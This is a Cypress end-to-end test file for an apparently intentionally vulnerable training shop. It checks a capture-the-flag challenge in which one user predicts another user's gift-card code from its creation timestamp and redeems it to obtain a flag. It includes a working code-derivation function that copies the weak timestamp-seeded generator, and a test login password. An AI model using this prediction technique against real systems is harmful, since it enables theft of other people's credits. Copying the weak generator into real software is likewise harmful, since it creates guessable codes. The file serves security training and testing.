const SEEDED_RECIPIENT = "forgotten-friend@oopssec.store";
const SEEDED_GIFT_CARD_ID = "gc-seeded-001";

const ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

function deriveGiftCardCode(createdAtMs: number): string {
  let state = createdAtMs & 0x7fffffff;
  const chars: string[] = [];
  for (let i = 0; i < 12; i++) {
    state = (Math.imul(state, 1103515245) + 12345) & 0x7fffffff;
    const index = (state >>> 16) % ALPHABET.length;
    chars.push(ALPHABET[index]);
  }
  return `${chars.slice(0, 4).join("")}-${chars
    .slice(4, 8)
    .join("")}-${chars.slice(8, 12).join("")}`;
}

describe("Insecure Randomness - Gift Card (E2E)", () => {
  it("buyer sees the seeded card in the sent list with millisecond precision", () => {
    cy.loginAsAlice();
    cy.visit("/profile/gift-cards");

    cy.contains(SEEDED_RECIPIENT, { timeout: 10000 }).should("be.visible");
    cy.contains("$500.00").should("be.visible");
    cy.contains(/\.\d{3}/).should("exist");
  });

  it("resend button returns a service-unavailable error", () => {
    cy.loginAsAlice();
    cy.visit("/profile/gift-cards");

    cy.contains(SEEDED_RECIPIENT, { timeout: 10000 })
      .closest("li, article, div[class*='rounded']")
      .within(() => {
        cy.contains("button", /resend/i).click();
      });

    cy.contains(/email service temporarily unavailable/i, {
      timeout: 5000,
    }).should("be.visible");
  });

  it("attacker derives the code from createdAt, redeems the card, and receives the flag", () => {
    cy.request({
      method: "POST",
      url: "/api/auth/login",
      body: { email: "alice@example.com", password: "iloveduck" },
    });

    cy.request("GET", "/api/gift-cards").then((response) => {
      expect(response.status).to.eq(200);
      const cards = response.body as Array<{
        id: string;
        createdAt: string;
        recipientEmail: string;
      }>;
      const seeded = cards.find((card) => card.id === SEEDED_GIFT_CARD_ID);
      expect(seeded, "seeded gift card is present").to.exist;

      const derivedCode = deriveGiftCardCode(
        new Date(seeded!.createdAt).getTime()
      );

      cy.clearCookies();
      cy.loginAsBob();
      cy.visit("/checkout/redeem");

      cy.get("input#giftCardCode").type(derivedCode);
      cy.contains("button", /redeem gift card/i).click();

      cy.contains(/\$500\.00 credited/i, { timeout: 10000 }).should(
        "be.visible"
      );
      cy.contains(/OSS\{[^}]+\}/, { timeout: 5000 })
        .invoke("text")
        .then((text) => {
          const match = text.match(/OSS\{[^}]+\}/);
          expect(match).to.not.be.null;
          cy.verifyFlag(match![0]);
        });
    });
  });
});
